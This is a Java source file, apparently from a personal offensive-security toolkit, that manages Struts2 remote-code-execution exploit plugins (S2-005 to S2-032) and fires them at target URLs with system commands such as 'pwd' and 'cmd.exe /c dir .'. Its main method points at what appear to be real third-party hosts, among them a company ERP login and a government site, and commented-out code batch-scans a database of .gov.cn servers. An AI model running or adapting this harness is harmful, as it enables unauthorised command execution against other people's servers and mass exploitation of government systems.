package com.mtx.xiatian.hacker.struts2Scan;

import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;

import com.mtx.xiatian.hacker.CommonTools;

public class Struts2ScanManager extends CommonTools
{

	private static transient Struts2ScanManager	_ins	= null;

	List<IStruts2Scan>	                        s2List	= null;

	/**
	 * 获取单实例
	 * 
	 * @return
	 */
	public static Struts2ScanManager getInstance()
	{
		if (null == _ins)
			_ins = new Struts2ScanManager();
		return _ins;
	}

	// 注册插件
	private Struts2ScanManager()
	{
		s2List = new ArrayList<IStruts2Scan>();
		// struts2
		registS2Scan(S2_005.class.getName());
		registS2Scan(S2_009.class.getName());
		registS2Scan(S2_013.class.getName());
		registS2Scan(S2_016.class.getName());
		registS2Scan(S2_019.class.getName());
		registS2Scan(S2_032.class.getName());
		super.useMysql();
		super.hvLastScan = false;
	}

	/**
	 * 注册插件
	 * 
	 * @param S2ClassName
	 */
	public void registS2Scan(String S2ClassName)
	{
		if (null == S2ClassName)
			return;
		// 未注册才继续
		if (null == getS2PlugIn(S2ClassName))
		{
			try
			{

				@SuppressWarnings("unchecked")
				Class<IStruts2Scan> c = (Class<IStruts2Scan>) Class.forName(S2ClassName);
				s2List.add(c.newInstance());
			} catch (Throwable e)
			{
				e.printStackTrace();
			}
		}
	}

	/**
	 * 获取过滤器
	 * 
	 * @param S2ClassName
	 * @return
	 */
	public IStruts2Scan getS2PlugIn(String S2ClassName)
	{
		IStruts2Scan is2 = null;
		for (int i = 0; i < s2List.size(); i++)
		{
			is2 = s2List.get(i);
			if (S2ClassName.equals(is2.getClass().getName()))
			{
				break;
			}
			is2 = null;
		}
		return is2;
	}

	public String szSuccessAction = null;
	/**
	 * 默认的aciton批量检测
	 * @param szUrl
	 */
	public void doS2DefaultAction(String szUrl, List<Object[]> list, String cmd)
	{
		szUrl = szUrl.endsWith("/") ? szUrl : szUrl + "/";
		if(null != szSuccessAction)
			doS2Scan(szUrl + szSuccessAction, list, cmd);
		else
		{
			String []a = "indexAction,j_spring_security_check,loginSuccessAction,loginFailureAction,exportGridDefaultExcel,exportGridDataAllExcel,resetCurrentPage,accessdeniedAction,sessionResourceAction,indexAction".split(",");
			for(String s:a)
			{
//				System.out.println("start : " + szUrl + s);
				doS2Scan(szUrl + s, list, cmd);
			}
		}
	}

	/**
	 * 循环调用插件
	 */
	public void doS2Scan(String url, List<Object[]> list, String cmd)
	{
		for (int i = 0; i < s2List.size(); i++)
		{
			IStruts2Scan s2Item = s2List.get(i);
			s2Item.setCmd(cmd);
			boolean result_leak = s2Item.doS2LeakScan(url);
			if(result_leak)
			{
				szSuccessAction = url.substring(url.lastIndexOf('/') + 1);
				String szNm = s2Item.getClass().getName();
				System.out.println(szNm + ":");
				System.out.println(s2Item.getResult());
				list.add(new Object[]{szNm, result_leak,s2Item.getResult()});
			}
		}
	}

	/**
	 * 
http://192.168.24:8080/Struts2/hello
.struts2Scan.S2_005 = true
.struts2Scan.S2_009 = true
http://192.168.24.19:8080/struts2_01/hello
.struts2Scan.S2_032 = true
	 * @param args
	 */
	public static void main(String[] args)
	{
		final List<Object[]> list1 = new ArrayList<Object[]>();
		// http://erp.yinhai.com:8089/yhhr/login.jsp
		String szUrl = 
//				"http://www.ccyb.gov.cn/zndtLogin";
				"https://erp.yinhai.com:18443/login.action";
//				"http://erp.yinhai.com:8089/yhhr/singleLoginAction.do";// 
				// "http://192.168.24.19:8080/struts2_01/hello";
//				"http://218.16.150.234/"
//		"http://192.168.24.19:8080/Struts2/hello"
				; // "http://192.168.24:8080/Struts2/hello";
		final Struts2ScanManager sm = Struts2ScanManager.getInstance();
		
		sm.
		doS2Scan
		(szUrl, list1, "pwd");
		sm.
		doS2Scan
		(szUrl, list1, "cmd.exe /c dir .");
//		sm.query("select url from zfwebserver where getnext=0 and url like '%.gov.cn' and not servername is null", new ArrayList<TreeMap<String, Object>>()
//				{
//					public boolean add(TreeMap<String, Object> data)
//					{
//						String url1 = String.valueOf(data.get("url"));
//						if("http://12345.kaiping.gov.cn".equals(url1))
//							return true;
//						System.out.println(url1);
//						sm.
//						doS2Scan
//						(url1, list1, "pwd");
//						sm.
//						doS2Scan
//						(url1, list1, "cmd.exe /c dir .");
//						sm.szSuccessAction = null;
//						return true;
//					}
//				});
		
//		for (Object []m : list1)
//		{
//			if(null != m && 3 == m.length)
//				System.out.println(m[0] + " = " + m[1] + "\n" + m[2]);
//		}
	}
}
